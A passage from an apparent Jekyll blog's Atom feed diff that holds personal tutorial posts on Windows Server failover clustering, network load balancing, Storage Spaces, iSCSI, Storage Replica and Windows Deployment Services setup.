+&lt;ul&gt;
+  &lt;li&gt;In the same actions pane, click create new cluster&lt;/li&gt;
+  &lt;li&gt;select the first server and cluster and add&lt;/li&gt;
+  &lt;li&gt;Name the cluster and type the IP address of the Cluster that we set up previously.&lt;/li&gt;
+  &lt;li&gt;Finish&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Your cluster should show up in the Cluster’s tool section of the Server Manager.&lt;/p&gt;
+
+&lt;h3 id=&quot;adding-a-shared-drive-to-the-cluster-iscsi&quot;&gt;Adding a shared Drive to the Cluster (iSCSI)&lt;/h3&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Installing the Failover Feature To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select Failover Clustering</summary></entry><entry><title type="html">Implementing Networking Load Balancing</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing.html" rel="alternate" type="text/html" title="Implementing Networking Load Balancing" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Networking-Load-Balancing.html">&lt;p&gt;Before you can Implement Network Load Balancing, here are some prerequisites:&lt;/p&gt;
+
+&lt;h3 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;All hosts in the cluster must be on the same subnet&lt;/li&gt;
+  &lt;li&gt;All adapters in cluster must be setup as either &lt;em&gt;multicast&lt;/em&gt; or &lt;em&gt;unicast&lt;/em&gt; but not a mixture of both&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;if unicast&lt;/em&gt; the NIC used to handle client-to-cluster traffic must support changing its MAC address&lt;/li&gt;
+  &lt;li&gt;IPs must be static on the nodes.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;installing-nlb-nodes&quot;&gt;Installing NLB Nodes&lt;/h3&gt;
+&lt;p&gt;Like most other features. You must install this from Server Manager, add roles and features.&lt;/p&gt;
+
+&lt;p&gt;Select &lt;em&gt;Network Load Balancing&lt;/em&gt; from the features section.&lt;/p&gt;
+
+&lt;h3 id=&quot;creating-a-nlb-cluster&quot;&gt;Creating a NLB Cluster&lt;/h3&gt;
+
+&lt;p&gt;Under the Netowkr Load Blancing Manger&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Right click the cluster and click New Cluster&lt;/li&gt;
+  &lt;li&gt;Set the host as your current server&lt;/li&gt;
+  &lt;li&gt;Select the interface for this specific cluster&lt;/li&gt;
+  &lt;li&gt;find the IP address in the Dedicated IP address section and hit next&lt;/li&gt;
+  &lt;li&gt;Add an IP address that is shared by all clusters and it will add the IP to the adapters&lt;/li&gt;
+  &lt;li&gt;add the IP address for the NLB Cluster&lt;/li&gt;
+  &lt;li&gt;On the Cluster Parameters page, type the full internet name for the cluster, and then set operation mode to either Unicast or Multicast, etc.&lt;/li&gt;
+  &lt;li&gt;Set any applicable port rules&lt;/li&gt;
+  &lt;li&gt;Now just add hosts to this cluster as needed.&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Before you can Implement Network Load Balancing, here are some prerequisites:</summary></entry><entry><title type="html">Implementing Server Storage Spaces</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces.html" rel="alternate" type="text/html" title="Implementing Server Storage Spaces" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Server-Storage-Spaces.html">&lt;h3 id=&quot;software-defined-storage--storage-pools&quot;&gt;Software Defined Storage &amp;amp; Storage Pools&lt;/h3&gt;
+&lt;p&gt;Storage Pools and Storage spaces helps an admin to manage the storage infrastructure with in an enterprise environment. Before installing and configuring here is a quick overview.&lt;/p&gt;
+
+&lt;p&gt;Storage pools are a type of software defined storage system that takes multiple physical devices and creates a single Pool resource to create virtual ‘logical’ volumes from. Imagine having 3 harddrives 2 GB a piece. Then you collect their storage capabilities together to then create something like 2 VHDs with 3GB of space each. This is &lt;em&gt;sort of&lt;/em&gt; how Storage Pools work.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+|--------------------------|--------------------------|
+|                          |                          |
+|          3GB             |          3GB             | ----- Logical Volumes
+|                          |                          |
+|--------------------------|--------------------------|
+|-----------------------------------------------------|
+|                                                     |
+|                         6GB                         | ----- Volume Pool
+|                                                     |
+|-----------------------------------------------------|
+|-----------------|-----------------|-----------------|
+|                 |                 |                 |
+|       2GB       |       2GB       |       2GB       | ----- Physical Volumes
+|                 |                 |                 |
+|-----------------|-----------------|-----------------|
+
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are ways to arrange the pool’s resources such that instead of just adding up all the space, you use some of the space as a redudant system to create a failsafe. Pools can allow for a drive to completely fail and the data saved onto that logical volume still be accessible.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: this look familiar if you’ve used LVM before. Same concepts. It’s all software defined storage.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;adding-the-feature&quot;&gt;Adding the Feature&lt;/h3&gt;
+
+&lt;p&gt;As done before, make sure that the File and Storage Services feature is installed from the Server Manager &amp;gt; Manage &amp;gt; Add Roles and Features.&lt;/p&gt;
+
+&lt;h3 id=&quot;configuring-storage-pools-and-storage-spaces&quot;&gt;Configuring Storage Pools and Storage Spaces&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;In Server Manager head to File and Storage Services&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/2.png&quot; alt=&quot;Go to file and storage services&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Select the Storage Pools option from the left menu&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/3.png&quot; alt=&quot;Go to Storage pools&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;In the top right corner select TASKS and then New Storage Pool&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/4.png&quot; alt=&quot;go to tasks and new storage pool&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Now give this new pool a name and select which group of disks you’d like to use.
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/5.png&quot; alt=&quot;name it&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Now you should be able to add the disk you’d like to use in this pool. You have options for allocation for setting up hot swaps if needed. &lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/6.png&quot; alt=&quot;add physical disks (you need three for RAID5)&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Review the summary and click create&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/7.png&quot; alt=&quot;confirm&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;creating-volumes-in-the-pool&quot;&gt;Creating volumes in the pool&lt;/h3&gt;
+
+&lt;p&gt;Now that your physical drives are being used in a pool, you’ll need to create logical volumes or virtual drives to be able to utilize the storage.&lt;/p&gt;
+
+&lt;h3 id=&quot;creating-a-virtual-disk-in-the-pool&quot;&gt;Creating a Virtual Disk in the Pool&lt;/h3&gt;
+&lt;p&gt;So now you can see that you have a new storage pool but under it there is a section for Virtual Disks, and it’s empty.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Click Tasks and click create new virtual disk. Or you can click the &lt;em&gt;New Virtual Disk Wizard&lt;/em&gt; link within the virtual disk section. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/8.png&quot; alt=&quot;New Virtual Disk Wizard Link&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;It will then ask you to select the pool that you’d like to use. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/10.png&quot; alt=&quot;Selecting a pool&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;This next section is the layout section. Choose between:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Simple - no fail safe, allows for the most space usage
+Mirror - Drive is mirror onto other drives so if a failure happens, it can be found on another drive. *(this comes in a two way or three way flavor. Allowing for two drives to fail)*
+Parity - Works against single drive failures. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/storagespaces/11.png&quot; alt=&quot;Selecting Layout&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Select if you’d like to thin provision or a typical fixed provision. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/12.png&quot; alt=&quot;Privisioning Type setup&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;set the drive’s size.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/storagespaces/13.png&quot; alt=&quot;Selecting Size&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Now just review your options before you finish. &lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/14.png&quot; alt=&quot;Confirm options&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;The Wizard will now create your virtual disk and you should be able to find it in the Server Manager under the File and Storage Manager. &lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/15.png&quot; alt=&quot;New Virtual Disk in Manager&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;iscsi-storage&quot;&gt;iSCSI Storage&lt;/h2&gt;
+&lt;p&gt;With iSCSI you will have the iSCSI disk, target, and initiator. This can be very confusing at first. Let’s clear that up.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Disk&lt;/strong&gt; - The disk does not mean that it’s a physical iSCSI disk. What we are talking about is a VHD that is setup to communication using iSCSI&lt;br /&gt;
+&lt;strong&gt;Target&lt;/strong&gt; - The target is esentailly the iSCSI server. It will be where machines communicate to access the iSCSI resource.&lt;br /&gt;
+&lt;strong&gt;Initiator&lt;/strong&gt; - these are the machines on the network that ‘initiate’ a connection to the &lt;em&gt;Target&lt;/em&gt; to get access to the iSCSI Drive.&lt;/p&gt;
+
+&lt;h3 id=&quot;creating-a-iscsi-virtual-disk&quot;&gt;Creating a iSCSI Virtual Disk&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I’ll be skipping the iSCSI Role installation. The specific option you will want is the &lt;strong&gt;&lt;em&gt;iSCSI Services&lt;/em&gt;&lt;/strong&gt; with the &lt;strong&gt;&lt;em&gt;iSCSI Target Server&lt;/em&gt;&lt;/strong&gt; selection&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In the iSCSI section of the File and Storage Services Server Manager interface. Click &lt;em&gt;TASKS&lt;/em&gt; and create a new iSCSI Virtual Disk&lt;/li&gt;
+  &lt;li&gt;Select the volume you’d like to use.&lt;/li&gt;
+  &lt;li&gt;Give it a name&lt;/li&gt;
+  &lt;li&gt;Select the size and the space allocation type.&lt;/li&gt;
+  &lt;li&gt;You’ll now start making the Target. Click New iSCSI target&lt;/li&gt;
+  &lt;li&gt;Give it a name. You can use the &lt;em&gt;lon&lt;/em&gt; naming convention to help keep things organized.&lt;/li&gt;
+  &lt;li&gt;You will now add the iniatiator. Remember the initiator is the machine that will access this drive. You can add it by it’s name on the domain or by it’s IP address. 
+&lt;img src=&quot;/assets/img/servergifs/storagespaces/16.png&quot; alt=&quot;Setting up Initator&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: The iniatiator will actually have to iniate the connection. This is just setting up who can be iniatiators.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;You can setup CHAP to authenticate. This is a good security measure but doesn’t have to be setup for it to work. In the lab, you can skip this.&lt;/li&gt;
+  &lt;li&gt;Review your setup and complete.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You’ll see that the iSCSI section of the File and Storage Services will show that it clears the disk and then shows who is connected to it. For now it shouldn’t be connected to anyone.&lt;/p&gt;
+
+&lt;h3 id=&quot;iscsi-initiator&quot;&gt;iSCSI Initiator&lt;/h3&gt;
+&lt;p&gt;On another machine that you’d like to access the iSCSI drive from. You will use the iSCSI Initiator application to make this connection. You can find this in Tools within the Server Manager or you can search for it in the start bar on other Windows machines.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;For your target, enter in either the host name with the domain, or use it’s IP address to search for that machine under quick connect.&lt;/li&gt;
+  &lt;li&gt;If you setup the Initiator in the previous section. You should see &lt;em&gt;Login Succeeded.&lt;/em&gt; in the Progress Report section.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: before accessing the iSCSI drive, you will have to bring it online in Disk Management. It will not have allocated space and it will not be initialized as a disk. Set up this disk like a typical disk and give it a new volume before you can access it. &lt;em&gt;See my post on volumes to see more on how to do this&lt;/em&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;You’re done!&lt;/p&gt;
+
+&lt;h3 id=&quot;giving-your-iscsi-isns-domain-set-and-zone&quot;&gt;Giving your iSCSI iSNS Domain set and zone.&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;You can setup an iSNS server to give your iSCSI targets a domain name on your network. iSNS creates nodes with targets, disks, and initiators. You can give them zones and sets within the Domain called Discovery Domains. I won’t cover this now but it can be pretty useful.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;storage-replica&quot;&gt;Storage Replica&lt;/h2&gt;
+&lt;p&gt;Storage Replica is a feature that allows two servers create a complete block level copy over SMB between two drives. AKA a image quality copy over the network. It doesn’t use a snapshot type technology, but constantly sends data over. This is good for disastery recovery and for log backups, databases, etc.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This is not drive sharing. This is creating a copy of a drive from one drive to another.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;add-the-feature-first&quot;&gt;Add the feature first&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;In Add Roles and Features. Find and add Storage Relica.&lt;/li&gt;
+  &lt;li&gt;On the server you are creating a replica with. Do the same process.&lt;/li&gt;
+  &lt;li&gt;reboot both machines.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;configuring-in-powershell&quot;&gt;Configuring in Powershell&lt;/h3&gt;
+&lt;p&gt;There aren’t any GUI options for Storage Replica. You’ll have to do this in powershell.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;New-SRPartnership -SourceComputerName &amp;lt;Name&amp;gt; -SourceRGNName &amp;lt;Name&amp;gt; Source RG -sourceVolumeName &amp;lt;Drive Letter&amp;gt; -SourceLogVolumeName &amp;lt;Letter for replica&amp;gt; DestinationRG -DestinationVolume &amp;lt;Drive Letter&amp;gt; DestinationLogVolume &amp;lt;Drive Letter&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;SRPartnership is the relationship between two machines with Storage Replica running. This command creates that relationship.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: if you use computer names in this, you will need to make sure your DNS is working. Otherwise you can use IP addresses&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Run the commanlet and wait for it to complete with an output of the summary.&lt;/p&gt;
+
+&lt;p&gt;To check to see if your Storage Replica is working you can run this Powershell command:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(Get-SRGroup).Replicas | Select-Object Numofbyesremaining
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It will show how many bytes are left as it copies itself over.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Storage Replicas are great in combination with Failover to allow for a strong redudant system.&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Software Defined Storage &amp;amp; Storage Pools Storage Pools and Storage spaces helps an admin to manage the storage infrastructure with in an enterprise environment. Before installing and configuring here is a quick overview.</summary></entry><entry><title type="html">Implementing Windows Deployment Services</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Windows-Deployment-Services.html" rel="alternate" type="text/html" title="Implementing Windows Deployment Services" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Windows-Deployment-Services</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Windows-Deployment-Services.html">&lt;h2 id=&quot;how-it-works&quot;&gt;How it works&lt;/h2&gt;
+&lt;p&gt;Windows Deployment Services is a server role that allows an administrator to have install images ready for any machine on the network. It makes for simple installs as long as there is a DHCP server and a machine that is &lt;strong&gt;PXE boot&lt;/strong&gt; enabled.&lt;/p&gt;
+
+&lt;p&gt;Esentially the boot images will be stored on some storage device on the network. The WDS server will respond to the DHCP server when a machine is starting to PXE boot. Letting it know that it’s able to help with an installation over the network. The machine PXE booting will then give the user a list of bootable OSs sitting on the WDS and from there it’s almost identical to a typical installation.&lt;/p&gt;
+
+&lt;h4 id=&quot;the-dhcp-handles-the-request&quot;&gt;The DHCP handles the request&lt;/h4&gt;
+&lt;p&gt;The DHCP plays a huge part in making WDS work. Here is how the client requests for the install.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PXE client sents a UDP broadcast for a DHCP DISCOVER on port 67
+DHCP server replies directly with the IP address of the WDS Server on port 68 
+PXE client then reqests the name of the boot file from DHCP
+WDS server sends a DHCP ACK with the boot file name
+PXE client requests for that file
+PXE client then downloads the file via TFTP and then runs file
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: Active directory isn’t completely necessary to make this happen. The server needs to have the role installed and needs to be an admin on some domain. Otherwise any machine should be able to request WDS to help it out. You can set WDS to only talk to machines that have be prestaged, have machines request to be prestaged, or just have any machine chat with the WDS without worrying about it.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Okay let’s get to it. Before we install make sure you have these guys:&lt;/p&gt;
+
+&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;DHCP Server&lt;/strong&gt; (Router or Server)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Active Directory Domain Services&lt;/strong&gt; on a Sever setup as Administrator on that domain.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;DNS server&lt;/strong&gt; to point machines to the server for the PXE boot.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;OS install .iso&lt;/strong&gt; and files&lt;/li&gt;
+  &lt;li&gt;Server has &lt;strong&gt;NTFS system&lt;/strong&gt; to store the bootable images. (in paticular, something other than the HD holding the Server. WDS will slow your server down to a crawl otherwise)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;installing-the-wds-server-role&quot;&gt;Installing the WDS Server Role&lt;/h3&gt;
+&lt;p&gt;Like any other server role, you have to install it. Just in case you’ve missed the other posts on that. Here ya go:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;To install the WDS server role:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;In Server Manager go to the Manage option in the toolbar&lt;/li&gt;
+  &lt;li&gt;Add roles and features&lt;/li&gt;
+  &lt;li&gt;Hit next to pass the first prompt&lt;/li&gt;
+  &lt;li&gt;Select the server you’d like to add the Role&lt;/li&gt;
+  &lt;li&gt;then find the WDS option and check it off.&lt;/li&gt;
+  &lt;li&gt;hit next until you get to the end and allow it to install and restart if needed.&lt;/li&gt;
+  &lt;li&gt;Check to make sure your WDS role is on the side bar of Server Manager. If it’s there. You’re good to go!&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/wds/1.PNG&quot; alt=&quot;Server Manager&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;configuring-wds&quot;&gt;Configuring WDS&lt;/h2&gt;
+
+&lt;p&gt;Alright. Now that you’ve installed the feature. You’re going to have to set some of it up. Remember when I mentioned using a seperate storage device? Or who gets to talk with WDS? This is that part. Here ya go:&lt;/p&gt;
+
+&lt;p&gt;When you open the WDS section, it will show the Servers and the Events for this role. Use this if you have multiple servers handling WDS or you’d like to see how a deployment went.&lt;/p&gt;
+
+&lt;p&gt;For now we want to make sure this server is configured.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Right click the server you’re adding WDS to and in the drop down menu select Windows Deployment Services. &lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/wds/5.png&quot; alt=&quot;Opening WDS Management Console&quot; /&gt;&lt;br /&gt;
+&lt;em&gt;You can also find Windows Deployment Services by searching it in the Start menu.&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/wds/2.PNG&quot; alt=&quot;WDS&quot; /&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Find the server you are installing on. It should be in the left side inventory section.&lt;/li&gt;
+  &lt;li&gt;If you have just added WDS as a feature, it should give you a warning page to let you know that it needs to be configured.&lt;/li&gt;
+  &lt;li&gt;Right click the server and select configure server.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;Set up with these options:&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Integrated with Active Directory
+&lt;img src=&quot;/assets/img/servergifs/wds/8.png&quot; alt=&quot;Configuring WDS Active Directory or Standalone&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;default Installation Folder Location &lt;em&gt;or to your specific needs&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note-1: if this server is also the DHCP, the additional options for Proxy DHCP Server will be given as well. Just check both sections off. 
+&lt;img src=&quot;/assets/img/servergifs/wds/6.png&quot; alt=&quot;Configuring WDS DHCP Prompt&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note-2: It’s important to know that in a lab envirnoment the locaiton of the install folder doesn’t matter. But almost always, you would want this drive to be somewhere seperate so it doesn’t use up resources on your Server machine&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/wds/9.png&quot; alt=&quot;Selecting Volume for WDS Images Warning&quot; /&gt;&lt;/p&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Set the &lt;strong&gt;PXE Server Initial Settings&lt;/strong&gt; as needed. For the lab, &lt;em&gt;Respond to all client computers&lt;/em&gt; should be fine. This is just setting the parameters for what computers can use this feature to install. 
+&lt;img src=&quot;/assets/img/servergifs/wds/10.png&quot; alt=&quot;PXE Respond to prompt&quot; /&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: You can set it up so that only computer you have prestaged can get installs. This is most likely the more secure option but requires more planning and work as an admin.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It will begin configuring the WDS. You can click finish if you’re done. If you’d like to start adding images to use with WDS, you can check off &lt;em&gt;Add images to the server now&lt;/em&gt;. Otherwise adding images can be found under the server’s drop down in Windows Deployment Services. 
+&lt;img src=&quot;/assets/img/servergifs/wds/3.png&quot; alt=&quot;WDS after config&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;adding-images-to-wds-server&quot;&gt;Adding Images to WDS Server&lt;/h2&gt;
+
+&lt;p&gt;To use WDS with an install, you need to make &lt;strong&gt;both&lt;/strong&gt; a boot image and a install image. This is where your install .iso comes in play. Depending on which Windows or Windows Sever install you’re looking to deploy. Load up the disk or flash drive to the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;boot.wim&lt;/em&gt; - found inside the .iso under Sources
+&lt;em&gt;install.wim&lt;/em&gt; - also found inside the .iso under Sources.&lt;/p&gt;
+
+&lt;h4 id=&quot;adding-the-boot-image&quot;&gt;Adding the Boot Image:&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Go to Server Manager&lt;/li&gt;
+  &lt;li&gt;go to tools and then find Windows Deployement Services in the dropdown list.&lt;/li&gt;
+  &lt;li&gt;Right click Boot Images and click Add Boot Image
+&lt;img src=&quot;/assets/img/servergifs/wds/4.png&quot; alt=&quot;adding image file&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Find the &lt;em&gt;boot.wim&lt;/em&gt; file. Click Open&lt;/li&gt;
+  &lt;li&gt;Next until finished.&lt;br /&gt;
+&lt;strong&gt;Do yourself a favor and name the image something specific to that OS, when PXE lists the options, this Image name is what it will show you&lt;/strong&gt; 
+&lt;img src=&quot;/assets/img/servergifs/wds/7.png&quot; alt=&quot;Naming the imagine file&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;adding-the-install-image&quot;&gt;Adding the Install Image:&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Go to server Manager&lt;/li&gt;
+  &lt;li&gt;go to tools and then find Windows Deployement Services in the dropdown list.&lt;/li&gt;
+  &lt;li&gt;Right click Install Images and click Add Install&lt;/li&gt;
+  &lt;li&gt;It will make you create a group image. Name this image something descriptive. example: &lt;em&gt;Windows Server 2016 64 bit&lt;/em&gt;
+&lt;img src=&quot;/assets/img/servergifs/wds/11.png&quot; alt=&quot;Images summary&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Find the install.wim file. Click Open&lt;/li&gt;
+  &lt;li&gt;Check off the OS images that you’d like to include if there are more than one.&lt;/li&gt;
+  &lt;li&gt;Next until finished.&lt;/li&gt;
+  &lt;li&gt;wait for the Image Wizard to complete.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: you can also create capture images on machines that have been updated, configured, and have paticular programs installed. This is covered in a later post.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;using-wds-to-install&quot;&gt;Using WDS to install&lt;/h2&gt;
+
+&lt;p&gt;Now all you have to do is boot up the machine and make sure the PXE boot is enabled. &lt;strong&gt;It’s important that the machine or VM is set to Legacy booting.&lt;/strong&gt; Make sure the machine is on the network and it should handle the rest. Follow your typical install steps and you’re done and done!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/wds/12.png&quot; alt=&quot;Install working fine&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There you go.&lt;/p&gt;
+
+&lt;p&gt;Cheers,&lt;/p&gt;
+
+&lt;p&gt;Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">How it works Windows Deployment Services is a server role that allows an administrator to have install images ready for any machine on the network. It makes for simple installs as long as there is a DHCP server and a machine that is PXE boot enabled.</summary></entry></feed>
